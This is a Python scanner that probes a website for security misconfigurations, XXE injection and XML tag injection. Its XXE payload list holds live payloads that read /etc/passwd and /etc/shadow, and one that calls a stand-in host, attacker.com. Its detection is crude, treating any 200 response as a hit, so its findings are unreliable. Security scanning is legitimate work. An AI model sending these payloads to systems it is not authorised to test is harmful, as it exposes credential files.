import requests 
from urllib.parse import urljoin

def scan_security_misconfigurations(url):

    results = []

    # Check for missing security headers
    missing_headers = scan_for_missing_headers(url)

    if missing_headers:

        results.append(f"Missing Headers: {', '.join(missing_headers)}")

    # Scan for RIA policy files
    ria_vulnerabilities = scan_for_ria_policy_files(url)

    if ria_vulnerabilities:

        results.extend(ria_vulnerabilities)

    # Scan for improper logging
    improper_logging_issues = scan_for_improper_logging(url)

    if improper_logging_issues:

        results.extend(improper_logging_issues)

    # Scan for XXE injection vulnerabilities
    xxe_vulnerabilities = scan_for_xxe_injection(url)

    if xxe_vulnerabilities:

        results.extend(xxe_vulnerabilities)

    # Scan for Tag Injection vulnerabilities
    tag_injection_vulnerabilities = scan_for_tag_injection(url)

    if tag_injection_vulnerabilities:

        results.extend(tag_injection_vulnerabilities)

    return results

def scan_for_missing_headers(url):

    headers_file = 'scanner/headers.txt'

    headers = load_headers(headers_file)

    missing_headers = []

    try:
        response = requests.get(url)

        response.raise_for_status()

        for header in headers:

            if header not in response.headers:

                missing_headers.append(header)

    except requests.RequestException as reqexception:

        print(f"Error fetching URL {url}: {reqexception}")

    return missing_headers

def load_headers(file_name):

    headers = []

    try:

        with open(file_name, 'r') as file:

            headers = [line.strip() for line in file.readlines()]

    except FileNotFoundError:

        print(f"File {file_name} not found.")

    return headers

def scan_for_ria_policy_files(base_url):

    policy_files = ["crossdomain.xml", "clientaccesspolicy.xml"]

    vulnerabilities = []

    for policy_file in policy_files:

        policy_url = urljoin(base_url, policy_file)

        try:

            response = requests.get(policy_url)

            if response.status_code == 200:

                vulnerabilities.append(f"Found {policy_file} at {policy_url}")

                if "*" in response.text:

                    vulnerabilities.append(f"Overly permissive policy found in {policy_file} at {policy_url}")

            else:

                vulnerabilities.append(f"{policy_file} not found at {policy_url}")

        except requests.RequestException as reqexception:

            vulnerabilities.append(f"Error accessing {policy_file} at {policy_url}: {reqexception}")

    return vulnerabilities

def scan_for_improper_logging(url):

    logging_issues = []

    sensitive_words = ["password", "credit card", "ssn", "private key", "secret"]

    try:

        response = requests.get(url)

        for word in sensitive_words:

            if word in response.text.lower():

                logging_issues.append(f"Sensitive data found in logs: {word}")

    except requests.RequestException as reqexception:

        logging_issues.append(f"Error while checking for logging issues at {url}: {reqexception}")

    return logging_issues


def scan_for_xxe_injection(url):

    xxe_payloads = [

        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>',

        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',

        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>',

        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',

        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>'

    ]

    results = []

    for payload in xxe_payloads:

        try:

            response = requests.post(url, data=payload, headers={"Content-Type": "application/xml"})

            if response.status_code == 200:

                results.append(f"XXE Injection payload triggered: {payload}")

        except requests.RequestException as reqexception:

            results.append(f"Error while testing XXE injection at {url}: {reqexception}")

    return results

def scan_for_tag_injection(url):

    tag_injection_payloads = [

        "<?xml version='1.0' encoding='ISO-8859-1'?><users><user><username>tony</username><password>Un6R34kb!e</password><!--<mail>s4tan@hell.com</mail><userid>0</userid>--><mail>s4tan@hell.com</mail></user></users>"

    ]

    results = []

    for payload in tag_injection_payloads:

        try:

            response = requests.post(url, data=payload, headers={"Content-Type": "application/xml"})

            if response.status_code == 200:

                results.append(f"Tag Injection payload triggered: {payload}")

        except requests.RequestException as reqexception:

            results.append(f"Error while testing Tag Injection at {url}: {reqexception}")

    return results

